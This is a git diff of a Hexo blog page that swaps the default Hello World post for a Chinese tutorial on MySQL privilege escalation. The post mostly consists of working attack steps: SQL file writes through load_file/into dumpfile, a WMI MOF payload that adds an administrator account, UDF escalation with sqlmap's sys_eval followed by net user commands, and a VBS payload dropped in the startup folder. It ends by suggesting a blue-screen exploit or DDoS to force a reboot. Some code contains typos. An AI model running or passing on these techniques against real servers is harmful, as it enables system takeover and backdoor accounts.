@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="alanlitl">
   <meta name="keywords" content="">
-  <title>Hello World - alanlitl-blog</title>
+  <title>MYSQL提权复现 - alanlitl-blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -162,7 +162,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Hello World">
+            <span class="h2" id="subtitle" title="MYSQL提权复现">
               
             </span>
 
@@ -172,7 +172,7 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-11-22 13:51" pubdate>
+      <time datetime="2020-11-22 16:21" pubdate>
         2020年11月22日 下午
       </time>
     </span>
@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      75 字
+      692 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      10
        分钟
     </span>
   
@@ -224,22 +224,118 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Hello World</h1>
+            <h1 style="display: none">MYSQL提权复现</h1>
             
             <div class="markdown-body">
-              <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span></code></pre>
+              <p>[toc]</p>
+<pre><code class="hljs sql">mysql写权限
+查询写权限
+<span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&quot;secure_file_priv&quot;</span>;
+查询结果不能为null</code></pre>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="hljs bash">$ hexo server</code></pre>
+<blockquote>
+<p>修改配置文件 windows下为my.ini   linux为my.cnf</p>
+<p>secure_file_priv =’’ </p>
+<p>null为不允许导入导出</p>
+<p>空白则为任意</p>
+<p>/tmp则为只能在/tmp目录下</p>
+</blockquote>
+<pre><code class="hljs sql">查看mysql pulgin文件目录
+	<span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&quot;pulgin%&quot;</span>;
+查看系统版本
+	<span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&quot;%compile%&quot;</span>;</code></pre>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="hljs bash">$ hexo generate</code></pre>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="hljs bash">$ hexo deploy</code></pre>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<h1 id="mof提权-失败"><a href="#mof提权-失败" class="headerlink" title="mof提权(失败)"></a>mof提权(失败)</h1><blockquote>
+<p>在windows的<code>C:/windows/system32/wbem/mof/nullevt.mof</code>文件中, 会间接以系统权限执行一次, 写入我们的恶意代码即可被系统执行</p>
+</blockquote>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">load_file</span>(<span class="hljs-string">&quot;上传文件的路径/evil.mof&quot;</span>) <span class="hljs-keyword">into</span> <span class="hljs-keyword">dumpfile</span> <span class="hljs-string">&quot;C:/windows/system32/wbem/mof/nullevt.mof&quot;</span></code></pre>
+
+<pre><code class="hljs nsis">mof文件
+添加用户
+instanbce of ActiveScriptEventConsumer as <span class="hljs-variable">$Consumer</span>
+&#123;
+	<span class="hljs-keyword">Name</span> = <span class="hljs-string">&quot;consPCSV2&quot;</span><span class="hljs-comment">;</span>
+	ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span><span class="hljs-comment">;</span>
+	ScripptText = <span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe <span class="hljs-literal">user</span> <span class="hljs-literal">admin</span> <span class="hljs-literal">admin</span> /add\<span class="hljs-string">&quot;)&quot;</span><span class="hljs-comment">;</span>
+&#125;<span class="hljs-comment">;</span>
+
+提权
+instanbce of ActiveScriptEventConsumer as <span class="hljs-variable">$Consumer</span>
+&#123;
+	<span class="hljs-keyword">Name</span> = <span class="hljs-string">&quot;consPCSV2&quot;</span><span class="hljs-comment">;</span>
+	ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span><span class="hljs-comment">;</span>
+	ScripptText = <span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net localgroup administrators <span class="hljs-literal">admin</span> /add\<span class="hljs-string">&quot;)&quot;</span><span class="hljs-comment">;</span>
+&#125;<span class="hljs-comment">;</span>
+
+完整代码
+复制代码
+<span class="hljs-comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span>
+
+instance of __EventFilter as <span class="hljs-variable">$EventFilter</span> 
+&#123; 
+    EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span><span class="hljs-comment">; </span>
+    <span class="hljs-keyword">Name</span>  = <span class="hljs-string">&quot;filtP2&quot;</span><span class="hljs-comment">; </span>
+    Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span> 
+            <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span> 
+            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span><span class="hljs-comment">; </span>
+    QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span><span class="hljs-comment">; </span>
+&#125;<span class="hljs-comment">; </span>
+
+instance of ActiveScriptEventConsumer as <span class="hljs-variable">$Consumer</span> 
+&#123; 
+    <span class="hljs-keyword">Name</span> = <span class="hljs-string">&quot;consPCSV2&quot;</span><span class="hljs-comment">; </span>
+    ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span><span class="hljs-comment">; </span>
+    ScriptText = 
+    <span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe <span class="hljs-literal">user</span> <span class="hljs-literal">admin</span> <span class="hljs-literal">admin</span> /add\<span class="hljs-string">&quot;)&quot;</span><span class="hljs-comment">; </span>
+&#125;<span class="hljs-comment">; </span>
+
+instance of __FilterToConsumerBinding 
+&#123; 
+    Consumer   = <span class="hljs-variable">$Consumer</span><span class="hljs-comment">; </span>
+    Filter = <span class="hljs-variable">$EventFilter</span><span class="hljs-comment">; </span>
+&#125;<span class="hljs-comment">; </span></code></pre>
+
+<h1 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h1><blockquote>
+<p>通过添加对应的自定义函数文件 实现提权</p>
+</blockquote>
+<blockquote>
+<p>mysql版本<strong>大于</strong>5.1版本. udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</p>
+<p>mysql版本<strong>小于</strong>5.1版本. udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</p>
+</blockquote>
+<pre><code class="hljs pgsql">先将sqlmap自带的udf文件转为udf.dll文件(linux为.so文件), 在sqlmap下的sqlmap\extra\cloak\cloak.py文件 
+	python cloak.py -d -i C:\sqlmap\data\udf\mysql\windows\<span class="hljs-number">64</span>\lib_mysqludf_sys.dll_
+在mysql安装目录下存在lib/plugin目录 并且存在, 将sqlmap生成的udf文件移动到mysql对应目录下
+或者将文件转为<span class="hljs-number">16</span>进制 然后解码存入文件
+<span class="hljs-keyword">select</span> unhex(&quot;xxxxx16进制字符&quot;) <span class="hljs-keyword">into</span> dumpfile &quot;pulgin路径/udf.dll&quot;
+在mysql中引入udf文件
+	<span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;
+执行函数
+	<span class="hljs-keyword">select</span> sys_eval(&quot;whoami&quot;);
+创建用户 
+	net <span class="hljs-keyword">user</span> test root /<span class="hljs-keyword">add</span>/   root是密码
+	net localgroup administrators test /<span class="hljs-keyword">add</span>
+删除函数
+	<span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval;
+	delect <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=&quot;sys_eval&quot;;
+	
+</code></pre>
+
+<h1 id="vbs提权"><a href="#vbs提权" class="headerlink" title="vbs提权"></a>vbs提权</h1><blockquote>
+<p>将vbs文件放入window的C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup下 在windows启动时就会自动执行</p>
+</blockquote>
+<pre><code class="hljs routeros">sbs文件
+	创建test用户
+	<span class="hljs-builtin-name">set</span> <span class="hljs-attribute">sh</span>=wscript.createobject(&quot;wscript.shell&quot;)
+	sh.<span class="hljs-builtin-name">run</span> <span class="hljs-string">&quot;net user test11 qwe123! /add&quot;</span>
+导入文件夹 注意路径分割符
+select load_file(<span class="hljs-string">&quot;C:/上传的vbs文件/&quot;</span>) into dumpfile <span class="hljs-string">&quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/1.vbs&quot;</span></code></pre>
+
+<p>迫使服务器重启</p>
+<pre><code class="hljs 1c">蓝屏<span class="hljs-built_in">exp</span>
+ddos攻击</code></pre>
+
 
             </div>
             <hr>
@@ -256,15 +352,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/11/22/MYSQL%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">MYSQL提权复现</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2020/11/22/hello-world/">
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
